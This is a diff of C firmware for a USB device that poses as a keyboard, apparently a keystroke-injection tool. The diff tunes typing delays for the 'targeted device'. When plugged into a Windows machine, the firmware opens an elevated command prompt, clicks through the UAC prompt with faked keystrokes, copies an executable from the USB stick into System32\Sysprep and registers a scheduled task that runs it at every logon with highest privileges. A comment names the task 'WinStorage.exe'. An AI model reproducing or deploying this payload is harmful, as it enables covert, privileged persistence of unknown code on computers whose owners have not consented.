@@ -57,7 +57,7 @@
 #define ASCII_DELETE      (char) 0x7F
 
 //------raw hid--------
-//only use with type_char_raw/type_char_raw_with_mods
+//only use with type_char_raw / type_char_raw_with_mods
 #define HID_KEY_F1    0x3A
 #define HID_KEY_F2    0x3B
 #define HID_KEY_F3    0x3C
@@ -133,20 +133,20 @@ static const uint8_t hid_ascii_usage[128] = {
     ['.'] = HID_KEY_PERIOD, ['>'] = HID_KEY_PERIOD,
     ['/'] = HID_KEY_SLASH,  ['?'] = HID_KEY_SLASH,
 
-	[0x1B] = HID_KEY_ESCAPE, 
+    [0x1B] = HID_KEY_ESCAPE, 
 
-	[0x01] = HID_KEY_ARROW_UP,
-	[0x02] = HID_KEY_ARROW_DOWN,
-	[0x03] = HID_KEY_ARROW_LEFT,
-	[0x04] = HID_KEY_ARROW_RIGHT,
+    [0x01] = HID_KEY_ARROW_UP,
+    [0x02] = HID_KEY_ARROW_DOWN,
+    [0x03] = HID_KEY_ARROW_LEFT,
+    [0x04] = HID_KEY_ARROW_RIGHT,
 
-	[0x05] = HID_KEY_HOME,
-	[0x06] = HID_KEY_END,
-	[0x07] = HID_KEY_PAGE_UP,
-	[0x08] = HID_KEY_PAGE_DOWN,
+    [0x05] = HID_KEY_HOME,
+    [0x06] = HID_KEY_END,
+    [0x07] = HID_KEY_PAGE_UP,
+    [0x08] = HID_KEY_PAGE_DOWN,
 
-	[0x09] = HID_KEY_INSERT,
-	[0x7F] = HID_KEY_DELETE,
+    [0x09] = HID_KEY_INSERT,
+    [0x7F] = HID_KEY_DELETE,
 };
 
 static const uint8_t hid_ascii_shift[128] = {
@@ -186,12 +186,12 @@ static const uint8_t hid_ascii_shift[128] = {
 
 // Typing speed, lower the more buggy
 #define WAIT_STRING 2
-#define KEY_RELEASE 4
+#define KEY_RELEASE 3
 
-// Configure to match how slow the targeted device is, 150 is a slow but more consistent timing that should work on most
-#define WAIT_PROGRAMS 150
+// Configure to match how slow the targeted device is, 120 is a slow but more consistent timing that should work on most
+#define WAIT_PROGRAMS 120
 
-// path to download app
+// path to download app to
 #define WINDOWS_FILEPATH "C:\\Windows\\System32\\Sysprep\\"
 
 // path to copy app from your usb
@@ -252,39 +252,31 @@ int main(void)
 	initialiser();
 
 	type_char_with_mods('r', MOD_WIN);
-	sleep_ms(WAIT_PROGRAMS);
+	sleep_ms(WAIT_PROGRAMS / 2);
 	
 	type_string("cmd");
-	sleep_ms(WAIT_PROGRAMS / 3);
+	sleep_ms(WAIT_PROGRAMS / 2);
 
 	type_char_with_mods('\n', MOD_CTRL | MOD_SHIFT);
-	sleep_ms(WAIT_PROGRAMS * 10);
+	sleep_ms(WAIT_PROGRAMS * 7);
 
 	type_char(ASCII_ARROW_LEFT);
 	sleep_ms(WAIT_PROGRAMS);
 	enter();
-  sleep_ms(WAIT_PROGRAMS * 7);
+  sleep_ms(WAIT_PROGRAMS * 3);
 
-  type_string("copy ");
-  type_string(USB_FILEPATH);
-  type_string(APP_NAME);
-  type_char(' ');
-  type_string(WINDOWS_FILEPATH);
+  type_string("copy " USB_FILEPATH APP_NAME " " WINDOWS_FILEPATH);
   enter();
   sleep_ms(WAIT_PROGRAMS);
 
-  type_string("schtasks /create /sc onlogon /tn \"");
-  type_string(APP_NAME);
-  type_string("\" /tr \"");
-  type_string(WINDOWS_FILEPATH);
-  type_string(APP_NAME);
-  type_string("\" /rl highest /f");
+  type_string("schtasks /create /sc onlogon /tn \"" APP_NAME "\" /tr \"" WINDOWS_FILEPATH APP_NAME "\" /rl highest /f");
   enter();
-  sleep_ms(WAIT_PROGRAMS * 2);
+  sleep_ms(WAIT_PROGRAMS / 2);
   close();
-
 }
 
+//removal
+//schtasks /delete /tn "WinStorage.exe" /f
 
 //--------------------------------------------------------------------+
 // USB HID
@@ -443,16 +435,8 @@ static inline void type_string_with_mods(const char *s, uint8_t extra_mods) {
 
 
 
-
-
-
-
-
-
-
-
 //--------------------------------------------------------------------+
-// Need to be defined, dont seem to be useful/needed idk
+// Need to be defined, dont seem to be useful/needed
 //--------------------------------------------------------------------+
 
 // Invoked when device is mounted
